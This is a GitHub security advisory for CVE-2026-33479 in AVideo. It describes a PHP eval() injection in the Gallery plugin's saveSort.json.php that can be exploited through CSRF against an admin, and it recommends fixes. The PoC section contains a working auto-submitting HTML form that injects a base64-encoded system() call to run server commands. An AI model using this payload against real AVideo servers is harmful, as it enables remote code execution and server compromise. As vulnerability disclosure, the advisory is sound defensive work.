# [H] AVideo has PHP Code Injection via eval() in Gallery saveSort.json.php Exploitable Through CSRF Against Admin

## Summary
Severity: High
Advisory: GHSA-xggw-g9pm-9qhh
CVE: CVE-2026-33479
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-xggw-g9pm-9qhh
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The Gallery plugin's `saveSort.json.php` endpoint passes unsanitized user input from `$_REQUEST['sections']` array values directly into PHP's `eval()` function. While the endpoint is gated behind `User::isAdmin()`, it has no CSRF token validation. Combined with AVideo's explicit `SameSite=None` session cookie configuration, an attacker can exploit this via cross-site request forgery to achieve unauthenticated remote code execution — requiring only that an admin visits an attacker-controlled page.

## Details

**Vulnerable code** — `plugin/Gallery/view/saveSort.json.php:20-25`:

```php
if(!empty($_REQUEST['sections'])){
    $object = $gallery->getDataObject();
    foreach ($_REQUEST['sections'] as $key => $value) {
        $obj->sectionsSaved[] = array($key=>$value);
        eval("\$object->{$value}Order = \$key;");
    }
    $obj->error = !$gallery->setDataObject($object);
}
```

The `$value` variable from `$_REQUEST['sections']` is interpolated directly into the string passed to `eval()` with no sanitization — no allowlist, no regex validation, no escaping. Normal Gallery usage sends section names like `'Shorts'`, `'Trending'`, etc. from jQuery UI sortable, but the server enforces no such constraint.

**CSRF enablement** — `objects/include_config.php:134-137`:

```php
if ($isHTTPS) {
    ini_set('session.cookie_samesite', 'None');
    ini_set('session.cookie_secure', '1');
}
```

The session cookie is explicitly set to `SameSite=None`, which instructs browsers to send the cookie on cross-site requests. This is also reinforced in `objects/functionsPHP.php:330-333` where additional cookies are set with `SameSite=None; Secure`.

**No CSRF protection** — The endpoint performs no CSRF token validation, no Origin header check, no Referer header check, and no `X-Requested-With` header check. There is no global CSRF middleware in AVideo's bootstrap chain.

**Exploit chain:**
1. Attacker crafts a page with an auto-submitting form targeting `saveSort.json.php`
2. Admin visits the attacker's page (e.g., via a link in a comment, email, or message)
3. The browser sends the cross-site POST request **with the admin's session cookie** attached (due to `SameSite=None`)
4. `User::isAdmin()` passes because the admin's session is present
5. The injected PHP code in the `sections` array value is passed to `eval()` and executes

## PoC

**Step 1:** Host the following HTML on an attacker-controlled server:

```html
<!DOCTYPE html>
<html>
<body>
<form id="exploit" action="https://TARGET/plugin/Gallery/view/saveSort.json.php" method="POST">
  <input type="hidden" name="sections[0]" value="x=1;system(base64_decode('aWQ7aG9zdG5hbWU='));//">
</form>
<script>document.getElementById('exploit').submit();</script>
</body>
</html>
```

The base64 decodes to `id;hostname`.

**Step 2:** Lure an authenticated AVideo admin to visit the page.

**Step 3:** The eval on line 24 executes:
```php
$object->x=1;system(base64_decode('aWQ7aG9zdG5hbWU='));//Order = 0;
```

This breaks out of the property assignment, calls `system()` with attacker-controlled arguments, and comments out the rest of the line. The response JSON will contain the command output, but even without seeing the response, the command executes server-side.

**Expected result:** The `id` and `hostname` commands execute on the server under the web server's user context.

## Impact

- **Remote Code Execution** — An attacker achieves arbitrary PHP code execution on the server by luring an admin to visit a malicious page. No prior authentication or account on the target is required.
- **Full server compromise** — The attacker can read/write files, access the database, pivot to other services, install backdoors, or exfiltrate data.
- **Stealth** — The attack is a single form submission that completes in milliseconds. The admin may not notice anything unusual.
- **Blast radius** — Any AVideo instance running over HTTPS (which triggers `SameSite=None`) where an admin can be lured to click a link is vulnerable.

## Recommended Fix

**Primary fix — Replace `eval()` with an allowlist check:**

In `plugin/Gallery/view/saveSort.json.php`, replace lines 20-26:

```php
if(!empty($_REQUEST['sections'])){
    $object = $gallery->getDataObject();
    $allowedSections = ['Shorts', 'Trending', 'SiteSuggestion', 'Newest', 
                        'Subscribe', 'Popular', 'LiveStream', 'Category', 
                        'Program', 'Channel'];
    foreach ($_REQUEST['sections'] as $key => $value) {
        if (!in_array($value, $allowedSections, true)) {
            continue;
        }
        $obj->sectionsSaved[] = array($key => $value);
        $property = $value . 'Order';
        $object->$property = intval($key);
    }
    $obj->error = !$gallery->setDataObject($object);
}
```

This eliminates `eval()` entirely, validates `$value` against a known allowlist of section names, and uses dynamic property access (`$object->$property`) instead of code generation.

**Secondary fix — Add CSRF protection** to all state-changing endpoints, or at minimum set `SameSite=Lax` on session cookies instead of `SameSite=None` in `objects/include_config.php:135`:

```php
ini_set('session.cookie_samesite', 'Lax');
```

This prevents session cookies from being sent on cross-site form submissions, blocking the CSRF vector for all endpoints.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-xggw-g9pm-9qhh
- https://nvd.nist.gov/vuln/detail/CVE-2026-33479
- https://github.com/WWBN/AVideo/commit/087dab8841f8bdb54be184105ef19b47c5698fcb
- https://github.com/WWBN/AVideo
